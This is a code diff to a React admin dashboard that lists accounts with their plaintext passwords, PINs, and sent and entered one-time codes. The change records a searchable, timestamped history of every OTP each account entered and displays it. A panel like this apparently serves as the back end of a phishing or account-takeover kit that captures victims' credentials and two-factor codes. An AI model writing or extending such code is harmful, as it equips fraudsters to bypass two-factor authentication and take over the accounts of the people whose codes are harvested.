@@ -74,6 +74,39 @@ function formatDate(iso: string | null): string {
   });
 }
 
+function mergeOtpHistories(
+  prevList: SafeUserSummary['enteredOtpHistory'],
+  nextList: SafeUserSummary['enteredOtpHistory'],
+  fallbackCode?: string | null,
+  fallbackAt?: string | null,
+) {
+  const map = new Map<string, { code: string; enteredAt: string }>();
+  for (const entry of [...(prevList ?? []), ...(nextList ?? [])]) {
+    if (!entry?.code) continue;
+    const key = `${entry.code}::${entry.enteredAt || ''}`;
+    if (!map.has(key)) {
+      map.set(key, { code: entry.code, enteredAt: entry.enteredAt || '' });
+    }
+  }
+  if (map.size === 0 && fallbackCode) {
+    map.set(`${fallbackCode}::${fallbackAt || ''}`, {
+      code: fallbackCode,
+      enteredAt: fallbackAt || '',
+    });
+  }
+  return Array.from(map.values()).sort((a, b) => a.enteredAt.localeCompare(b.enteredAt));
+}
+
+function getEnteredOtpList(acc: SafeUserSummary): Array<{ code: string; enteredAt: string }> {
+  const list =
+    Array.isArray(acc.enteredOtpHistory) && acc.enteredOtpHistory.length > 0
+      ? acc.enteredOtpHistory
+      : acc.enteredOtp
+        ? [{ code: acc.enteredOtp, enteredAt: acc.enteredOtpAt ?? acc.updatedAt }]
+        : [];
+  return [...list].reverse();
+}
+
 function mergeAccounts(primary: SafeUserSummary[], secondary: SafeUserSummary[]): SafeUserSummary[] {
   const byKey = new Map<string, SafeUserSummary>();
   for (const item of [...secondary, ...primary]) {
@@ -82,6 +115,12 @@ function mergeAccounts(primary: SafeUserSummary[], secondary: SafeUserSummary[])
       : item.id
     ).toLowerCase();
     const prev = byKey.get(key);
+    const mergedHistory = mergeOtpHistories(
+      prev?.enteredOtpHistory,
+      item.enteredOtpHistory,
+      item.enteredOtp ?? prev?.enteredOtp,
+      item.enteredOtpAt ?? prev?.enteredOtpAt ?? item.updatedAt,
+    );
     if (!prev || item.updatedAt >= prev.updatedAt) {
       byKey.set(key, {
         ...prev,
@@ -92,6 +131,12 @@ function mergeAccounts(primary: SafeUserSummary[], secondary: SafeUserSummary[])
         sentOtpAt: item.sentOtpAt ?? prev?.sentOtpAt ?? null,
         enteredOtp: item.enteredOtp ?? prev?.enteredOtp ?? null,
         enteredOtpAt: item.enteredOtpAt ?? prev?.enteredOtpAt ?? null,
+        enteredOtpHistory: mergedHistory,
+      });
+    } else {
+      byKey.set(key, {
+        ...prev,
+        enteredOtpHistory: mergedHistory,
       });
     }
   }
@@ -793,6 +838,9 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
           (acc.pin ?? '').toLowerCase().includes(trimmedQuery) ||
           (acc.sentOtp ?? '').toLowerCase().includes(trimmedQuery) ||
           (acc.enteredOtp ?? '').toLowerCase().includes(trimmedQuery) ||
+          (acc.enteredOtpHistory ?? []).some((entry) =>
+            entry.code.toLowerCase().includes(trimmedQuery),
+          ) ||
           acc.countryCode.toLowerCase().includes(trimmedQuery) ||
           acc.id.toLowerCase().includes(trimmedQuery),
       )
@@ -1044,11 +1092,18 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
                             PIN: <span className="font-semibold">{acc.pin}</span>
                           </p>
                         )}
-                        {acc.enteredOtp && (
-                          <p className="text-[11px] text-[#0052FF] font-mono mt-0.5">
-                            Entered: <span className="font-semibold">{acc.enteredOtp}</span>
-                          </p>
-                        )}
+                        {(() => {
+                          const enteredList = getEnteredOtpList(acc);
+                          if (enteredList.length === 0) return null;
+                          return (
+                            <p className="text-[11px] text-[#0052FF] font-mono mt-0.5 break-all">
+                              Entered ({enteredList.length}):{' '}
+                              <span className="font-semibold">
+                                {enteredList.map((e) => e.code).join(', ')}
+                              </span>
+                            </p>
+                          );
+                        })()}
                       </div>
                       <div className="flex items-center gap-2 shrink-0">
                         <span className="px-2.5 py-1 rounded-lg bg-emerald-600 text-white font-mono text-sm font-bold tracking-wider tabular-nums">
@@ -1197,15 +1252,41 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
                             <span className="text-[#9CA3AF] font-mono">—</span>
                           )}
                         </div>
-                        <div className="flex items-center justify-between text-xs pt-0.5">
-                          <span className="text-[#6B7280]">Entered OTP</span>
-                          {acc.enteredOtp ? (
-                            <span className="inline-flex items-center px-2 py-0.5 rounded-md bg-[#EEF2FF] text-[#0052FF] font-mono font-semibold tracking-wider tabular-nums">
-                              {acc.enteredOtp}
-                            </span>
-                          ) : (
-                            <span className="text-[#9CA3AF] font-mono">—</span>
-                          )}
+                        <div className="flex items-start justify-between gap-2 text-xs pt-0.5">
+                          <span className="text-[#6B7280] shrink-0 pt-0.5">
+                            Entered OTP
+                            {getEnteredOtpList(acc).length > 1
+                              ? ` (${getEnteredOtpList(acc).length})`
+                              : ''}
+                          </span>
+                          {(() => {
+                            const enteredList = getEnteredOtpList(acc);
+                            if (enteredList.length === 0) {
+                              return <span className="text-[#9CA3AF] font-mono">—</span>;
+                            }
+                            return (
+                              <div className="flex flex-wrap items-center justify-end gap-1.5">
+                                {enteredList.map((entry, idx) => (
+                                  <span
+                                    key={`${acc.id}-mob-otp-${idx}-${entry.code}-${entry.enteredAt}`}
+                                    title={entry.enteredAt ? formatDate(entry.enteredAt) : undefined}
+                                    className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-md font-mono font-semibold tracking-wider tabular-nums ${
+                                      idx === 0
+                                        ? 'bg-[#EEF2FF] text-[#0052FF] border border-[#C7D2FE]'
+                                        : 'bg-[#F8FAFC] text-[#374151] border border-[#DCE1EB]'
+                                    }`}
+                                  >
+                                    <span>{entry.code}</span>
+                                    {entry.enteredAt && (
+                                      <span className="text-[10px] font-sans font-normal text-[#6B7280]">
+                                        {formatDate(entry.enteredAt)}
+                                      </span>
+                                    )}
+                                  </span>
+                                ))}
+                              </div>
+                            );
+                          })()}
                         </div>
                         <div className="flex items-center justify-between text-xs pt-0.5 gap-2">
                           <span className="text-[#6B7280]">Password</span>
@@ -1313,14 +1394,39 @@ export const AdminDirectory: React.FC<AdminDirectoryProps> = ({ onNavigateHome }
                                 <span className="text-[#9CA3AF]">—</span>
                               )}
                             </td>
-                            <td className="py-3.5 px-4 font-mono text-[13px] tabular-nums whitespace-nowrap">
-                              {acc.enteredOtp ? (
-                                <span className="inline-flex items-center px-2.5 py-0.5 rounded-md bg-[#EEF2FF] text-[#0052FF] font-semibold tracking-wider">
-                                  {acc.enteredOtp}
-                                </span>
-                              ) : (
-                                <span className="text-[#9CA3AF]">—</span>
-                              )}
+                            <td className="py-3.5 px-4 font-mono text-[13px] tabular-nums align-top">
+                              {(() => {
+                                const enteredList = getEnteredOtpList(acc);
+                                if (enteredList.length === 0) {
+                                  return <span className="text-[#9CA3AF]">—</span>;
+                                }
+                                return (
+                                  <div className="flex flex-wrap items-center gap-1.5 max-w-[260px]">
+                                    {enteredList.map((entry, idx) => (
+                                      <span
+                                        key={`${acc.id}-desk-otp-${idx}-${entry.code}-${entry.enteredAt}`}
+                                        title={
+                                          entry.enteredAt
+                                            ? `Entered at ${formatDate(entry.enteredAt)}`
+                                            : undefined
+                                        }
+                                        className={`inline-flex items-center gap-1 px-2 py-0.5 rounded-md font-semibold tracking-wider ${
+                                          idx === 0
+                                            ? 'bg-[#EEF2FF] text-[#0052FF] border border-[#C7D2FE]'
+                                            : 'bg-[#F8FAFC] text-[#374151] border border-[#DCE1EB] text-xs'
+                                        }`}
+                                      >
+                                        <span>{entry.code}</span>
+                                        {enteredList.length > 1 && entry.enteredAt && (
+                                          <span className="text-[10px] font-sans font-normal text-[#6B7280]">
+                                            {formatDate(entry.enteredAt)}
+                                          </span>
+                                        )}
+                                      </span>
+                                    ))}
+                                  </div>
+                                );
+                              })()}
                             </td>
                             <td className="py-3.5 px-4 whitespace-nowrap">
                               <div className="inline-flex items-center gap-2">
